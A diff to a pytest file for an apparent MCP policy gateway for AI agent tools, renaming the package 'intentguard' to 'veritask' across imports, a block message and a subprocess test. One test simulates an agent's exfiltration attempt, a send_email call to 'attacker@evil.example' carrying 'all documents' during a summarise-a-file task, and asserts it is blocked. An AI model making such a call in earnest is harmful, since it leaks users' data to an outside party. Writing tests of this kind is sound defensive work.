@@ -8,10 +8,10 @@ from pathlib import Path
 
 import pytest
 
-from intentguard import Gateway, PolicyEngine, compile_scope
-from intentguard.client import InProcessSession
-from intentguard.mcp_gateway import DEMO_TOOLS, McpGateway, StdioUpstream, build_proxy
-from intentguard.mock_env import MockEnv
+from veritask import Gateway, PolicyEngine, compile_scope
+from veritask.client import InProcessSession
+from veritask.mcp_gateway import DEMO_TOOLS, McpGateway, StdioUpstream, build_proxy
+from veritask.mock_env import MockEnv
 
 ROOT = Path(__file__).resolve().parent.parent
 FAKE = Path(__file__).with_name("fake_mcp_server.py")
@@ -62,7 +62,7 @@ def test_allowed_call_returns_content():
 def test_blocked_call_is_an_error_result_and_the_tool_never_runs():
     env, s = demo_server("Read research/inbox.md and summarize it.")
     r = call(s, "send_email", {"to": "attacker@evil.example", "body": "all documents"})
-    assert r["isError"] is True and r["content"][0]["text"].startswith("BLOCKED by IntentGuard")
+    assert r["isError"] is True and r["content"][0]["text"].startswith("BLOCKED by Veritask")
     assert env.outbox == []
 
 
@@ -75,7 +75,7 @@ def test_unlisted_tool_is_blocked_and_audited():
 
 def test_stdio_process_round_trip():
     env = {**os.environ, "PYTHONPATH": str(ROOT / "src")}
-    p = subprocess.Popen([sys.executable, "-m", "intentguard.mcp_gateway", "--demo", "--task",
+    p = subprocess.Popen([sys.executable, "-m", "veritask.mcp_gateway", "--demo", "--task",
                           "Read research/paper.pdf and summarize it.", "--grants", json.dumps(GRANTS)],
                          stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, env=env)
     msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-03-26"}},
